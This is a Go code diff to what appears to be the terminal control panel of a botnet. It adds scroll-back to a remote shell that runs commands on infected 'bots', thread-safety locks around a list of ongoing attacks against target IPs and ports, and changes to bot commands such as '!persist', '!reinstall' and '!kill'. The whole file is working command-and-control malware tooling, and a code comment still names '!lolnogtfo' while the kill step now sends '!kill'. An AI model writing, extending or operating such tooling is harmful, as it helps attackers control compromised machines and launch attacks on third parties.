@@ -267,12 +267,13 @@ type TUIModel struct {
 	launchAnimDur    string    // duration
 
 	// Remote shell
-	selectedBot     string // Bot ID for remote shell
-	selectedBotArch string
-	shellInput      string
-	shellOutput     []string // Output lines
-	shellHistory    []string // Command history
-	historyCursor   int
+	selectedBot        string // Bot ID for remote shell
+	selectedBotArch    string
+	shellInput         string
+	shellOutput        []string // Output lines
+	shellHistory       []string // Command history
+	historyCursor      int
+	shellScrollOffset  int // Lines scrolled up from bottom (0 = latest)
 
 	// Broadcast targeting
 	broadcastArch    string // Filter by architecture (empty = all)
@@ -433,9 +434,24 @@ func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 			for _, line := range lines {
 				m.shellOutput = append(m.shellOutput, line)
 			}
-			// Keep only last 50 lines
-			if len(m.shellOutput) > 50 {
-				m.shellOutput = m.shellOutput[len(m.shellOutput)-50:]
+			// Keep last 500 lines for scroll-back
+			if len(m.shellOutput) > 500 {
+				m.shellOutput = m.shellOutput[len(m.shellOutput)-500:]
+			}
+			// Auto-scroll to bottom if user is already at the bottom
+			if m.shellScrollOffset == 0 {
+				// Stay at bottom (no-op, offset already 0)
+			} else {
+				// User has scrolled up — keep their position, but adjust if
+				// lines were trimmed from the front of the buffer.
+				m.shellScrollOffset += len(lines)
+				maxOffset := len(m.shellOutput) - 13
+				if maxOffset < 0 {
+					maxOffset = 0
+				}
+				if m.shellScrollOffset > maxOffset {
+					m.shellScrollOffset = maxOffset
+				}
 			}
 		}
 		return m, nil
@@ -477,7 +493,7 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			case "y", "Y":
 				if m.confirmKill && m.currentView == ViewRemoteShell {
 					m.confirmKill = false
-					m.shellInput = "!lolnogtfo"
+					m.shellInput = "!kill"
 					return m.executeShellCommand()
 				}
 				if m.confirmBroadcast && m.currentView == ViewBroadcastShell {
@@ -677,8 +693,31 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 				m.shellInput = ""
 			}
 			return m, nil
+		case "pgup":
+			// Scroll shell output up
+			if m.currentView == ViewRemoteShell && m.remoteShellTab == 0 {
+				m.shellScrollOffset += 5
+				maxOffset := len(m.shellOutput) - 13
+				if maxOffset < 0 {
+					maxOffset = 0
+				}
+				if m.shellScrollOffset > maxOffset {
+					m.shellScrollOffset = maxOffset
+				}
+			}
+			return m, nil
+		case "pgdown":
+			// Scroll shell output down
+			if m.currentView == ViewRemoteShell && m.remoteShellTab == 0 {
+				m.shellScrollOffset -= 5
+				if m.shellScrollOffset < 0 {
+					m.shellScrollOffset = 0
+				}
+			}
+			return m, nil
 		case "ctrl+f":
 			m.shellOutput = []string{}
+			m.shellScrollOffset = 0
 			return m, nil
 		case "ctrl+p":
 			if m.currentView == ViewBroadcastShell {
@@ -994,10 +1033,12 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		// Stop all attacks (in attack view, ongoing tab)
 		if m.currentView == ViewAttack && m.attackViewMode == 1 {
 			// Count and clear telnet attacks
+			ongoingAttacksLock.Lock()
 			count := len(ongoingAttacks)
 			for k := range ongoingAttacks {
 				delete(ongoingAttacks, k)
 			}
+			ongoingAttacksLock.Unlock()
 			// Count and clear TUI attacks
 			count += len(tuiAttacks)
 			tuiAttacks = []TUIAttack{}
@@ -1138,6 +1179,7 @@ func (m TUIModel) handleEnter() (tea.Model, tea.Cmd) {
 			m.shellInput = ""
 			m.shellHistory = []string{}
 			m.historyCursor = 0
+			m.shellScrollOffset = 0
 			m.remoteShellTab = 0
 			m.remoteShortcutCur = 0
 			m.currentView = ViewRemoteShell
@@ -1271,9 +1313,15 @@ func (m TUIModel) executeShellCommand() (tea.Model, tea.Cmd) {
 		prompt := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("$")
 		m.shellOutput = append(m.shellOutput, prompt+" "+cmd)
 
-		fullCmd := fmt.Sprintf("!shell %s", cmd)
+		// Bot commands (e.g. !persist, !reinstall, !lolnogtfo) are sent
+		// directly; plain OS commands get wrapped with !shell.
+		fullCmd := cmd
+		if !strings.HasPrefix(cmd, "!") {
+			fullCmd = fmt.Sprintf("!shell %s", cmd)
+		}
 		sendToSingleBot(m.selectedBot, fullCmd)
 		m.shellInput = ""
+		m.shellScrollOffset = 0 // Snap to bottom to see command output
 		return m, nil
 	}
 
@@ -1794,11 +1842,13 @@ func (m TUIModel) viewAttack() string {
 
 	// Count ongoing attacks from both sources
 	ongoingCount := 0
+	ongoingAttacksLock.RLock()
 	for _, attack := range ongoingAttacks {
 		if time.Until(attack.start.Add(attack.duration)) > 0 {
 			ongoingCount++
 		}
 	}
+	ongoingAttacksLock.RUnlock()
 	for _, attack := range tuiAttacks {
 		if time.Until(attack.Start.Add(attack.Duration)) > 0 {
 			ongoingCount++
@@ -2041,6 +2091,7 @@ func (m TUIModel) viewAttack() string {
 				total     time.Duration
 			}{}
 
+			ongoingAttacksLock.RLock()
 			for _, attack := range ongoingAttacks {
 				remaining := time.Until(attack.start.Add(attack.duration))
 				if remaining > 0 {
@@ -2053,6 +2104,7 @@ func (m TUIModel) viewAttack() string {
 					}{attack.method, attack.ip, attack.port, remaining, attack.duration})
 				}
 			}
+			ongoingAttacksLock.RUnlock()
 
 			for _, attack := range tuiAttacks {
 				remaining := time.Until(attack.Start.Add(attack.Duration))
@@ -2421,20 +2473,37 @@ func (m TUIModel) viewRemoteShell() string {
 	switch m.remoteShellTab {
 	case 0: // Shell tab
 		outputHeight := 13
-		startIdx := 0
-		if len(m.shellOutput) > outputHeight {
-			startIdx = len(m.shellOutput) - outputHeight
+		totalLines := len(m.shellOutput)
+
+		// Calculate visible window based on scroll offset
+		endIdx := totalLines - m.shellScrollOffset
+		if endIdx < 0 {
+			endIdx = 0
+		}
+		startIdx := endIdx - outputHeight
+		if startIdx < 0 {
+			startIdx = 0
 		}
 
-		for i := startIdx; i < len(m.shellOutput); i++ {
+		visibleLines := 0
+		for i := startIdx; i < endIdx; i++ {
 			b.WriteString("  " + m.shellOutput[i] + "\n")
+			visibleLines++
 		}
 
-		for i := len(m.shellOutput); i < outputHeight; i++ {
+		for i := visibleLines; i < outputHeight; i++ {
 			b.WriteString("\n")
 		}
 
-		b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
+		// Scroll indicator
+		if m.shellScrollOffset > 0 {
+			scrollInfo := fmt.Sprintf("  ─── ↑ %d more lines (pgup/pgdown) ", m.shellScrollOffset)
+			b.WriteString(dim.Render(scrollInfo))
+		} else if totalLines > outputHeight {
+			b.WriteString(dim.Render("  ─── end (pgup to scroll) "))
+		} else {
+			b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
+		}
 		b.WriteString("\n")
 
 		if m.confirmKill {
@@ -2451,7 +2520,7 @@ func (m TUIModel) viewRemoteShell() string {
 			b.WriteString("\n\n")
 
 			hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
-			b.WriteString(dim.Render("  [enter] Execute  [↑/↓] History  [←/→] Tab  [ctrl+f] Clear  [esc] Menu\n"))
+			b.WriteString(dim.Render("  [enter] Execute  [↑/↓] History  [pgup/pgdn] Scroll  [ctrl+f] Clear  [esc] Menu\n"))
 			b.WriteString(fmt.Sprintf("  %s !persist  %s !reinstall  %s !kill\n",
 				hotkey.Render("[ctrl+p]"),
 				hotkey.Render("[ctrl+r]"),
@@ -2889,6 +2958,7 @@ func (m TUIModel) viewHelp() string {
 		shellKeys := []struct{ key, desc string }{
 			{"enter", "Execute typed command"},
 			{"↑ / ↓", "Navigate command history"},
+			{"pgup/pgdn", "Scroll output up/down"},
 			{"ctrl+p", "Send !persist command"},
 			{"ctrl+r", "Send !reinstall command"},
 			{"ctrl+x", "Kill bot (requires y/n confirm)"},
